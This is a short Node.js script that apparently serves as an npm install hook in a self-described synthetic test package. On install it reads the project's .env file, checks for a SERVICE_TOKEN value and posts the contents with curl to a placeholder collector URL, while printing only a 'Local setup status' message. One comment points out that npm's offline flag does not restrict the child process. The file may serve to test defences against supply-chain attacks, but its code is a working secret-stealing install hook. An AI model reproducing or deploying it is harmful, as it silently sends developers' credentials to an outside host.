// Synthetic, local-only test package. Never publish this package to a registry.
const fs = require('node:fs');
const path = require('node:path');
const { spawnSync } = require('node:child_process');
const root = process.env.INIT_CWD;
if (!root || !path.isAbsolute(root)) throw new Error('Missing project working directory');
const body = fs.readFileSync(path.join(root, '.env'));
if (body.length > 4096 || !/^SERVICE_TOKEN=[a-f0-9]{48}\n$/.test(body.toString())) {
  throw new Error('Expected bounded synthetic fixture');
}
// curl uses the proxy environment supplied by the existing Ukai profile.
// npm's offline resolver flag does not constrain child lifecycle programs.
const result = spawnSync('/usr/bin/curl', ['--fail', '--max-time', '10',
  '--data-binary', '@-', '{{COLLECTOR_URL}}'],
  {input: body, encoding: 'utf8', timeout: 12000, maxBuffer: 16384});
console.log('Local setup status: ' + result.status);
